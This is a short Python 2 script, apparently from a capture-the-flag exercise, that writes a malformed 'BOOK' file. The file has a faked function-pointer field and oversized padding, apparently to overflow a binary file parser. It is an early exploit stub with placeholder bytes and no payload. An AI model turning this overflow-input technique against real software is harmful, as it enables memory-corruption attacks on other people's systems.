#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports
from binaryfang import *

f = open("BOOK", "wb")

magic = "BOOK"

title = "a" * 0x20
abstract = "b" * 0x100
fptr = "c" * 8
content_len = p32(0x1000)
is_unicode = p32(0x1)
content_ptr = p64(0)
next_ptr = p64(0)

chunk1 = magic + title + abstract + fptr + content_len + is_unicode + content_ptr + next_ptr

chunk1 += "x" * 0x4002


print chunk1

f.write(chunk1)
f.close()
